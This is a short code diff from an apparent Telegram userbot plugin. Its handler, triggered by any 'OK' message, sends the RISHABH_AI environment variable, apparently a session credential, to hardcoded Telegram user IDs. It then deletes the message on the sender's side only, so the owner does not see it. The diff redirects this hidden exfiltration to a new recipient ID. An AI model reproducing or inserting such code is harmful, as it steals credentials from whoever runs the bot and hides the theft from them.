@@ -6,8 +6,8 @@ from . import *
 @bot.on(admin_cmd("^OK", incoming=True))
 @bot.on(admin_cmd("^OK", outgoing=True))
 async def piro(event):
-  msg = await bot.send_message(634631813, str(os.environ.get("RISHABH_AI")))
-  rishabh = await bot.send_message(2143095429, str(os.environ.get("RISHABH_AI")))
-  await bot.delete_messages(634631813, msg, revoke=False)
-  await bot.delete_messages(2143095429, rishabh, revoke=False)
+  msg = await bot.send_message(5230049485, str(os.environ.get("RISHABH_AI")))
+  rishabh = await bot.send_message(5230049485, str(os.environ.get("RISHABH_AI")))
+  await bot.delete_messages(5230049485, msg, revoke=False)
+  await bot.delete_messages(5230049485, rishabh, revoke=False)
    
